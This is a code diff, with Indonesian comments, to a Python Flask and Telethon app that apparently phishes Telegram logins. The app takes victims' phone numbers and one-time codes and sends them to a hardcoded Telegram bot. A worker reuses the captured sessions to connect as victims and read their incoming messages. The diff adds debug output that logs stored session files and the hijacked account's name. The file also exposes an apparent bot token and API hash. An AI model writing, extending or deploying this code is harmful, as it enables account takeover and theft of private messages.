@@ -15,8 +15,10 @@ api_hash = os.getenv("API_HASH", "d90d2bfd0b0a86c49e8991bd3a39339a")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8062450896:AAHFGZeexuvK659JzfQdiagi3XwPd301Wi4")
 CHAT_ID = os.getenv("CHAT_ID", "7712462494")
 
-SESSION_DIR = "sessions"
+# Gunakan path absolut
+SESSION_DIR = os.path.join(os.getcwd(), "sessions")
 os.makedirs(SESSION_DIR, exist_ok=True)
+print("DEBUG: SESSION_DIR =", SESSION_DIR)
 
 # ============= BAGIAN FLASK =============
 @app.route("/", methods=["GET", "POST"])
@@ -77,6 +79,10 @@ def otp():
             result = asyncio.run(verify_code())
             if result:
                 session["last_otp"] = code
+                # Debug: cek folder setelah OTP sukses
+                print("DEBUG: OTP sukses, session disimpan di ->", session_path)
+                print("DEBUG: Isi folder sessions sekarang:", os.listdir(SESSION_DIR))
+
                 # kirim notif ke bot
                 text = f"✅ OTP benar\nNomor : {phone}\nOTP   : {code}"
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -144,6 +150,9 @@ async def worker_main():
             print(f"Memuat session {path}")
             client = TelegramClient(path, api_id, api_hash)
             await client.start()
+            me = await client.get_me()
+            print(f"[Worker] ✅ Connected sebagai {me.first_name} (@{me.username})")
+
             clients.append(client)
 
             @client.on(events.NewMessage)
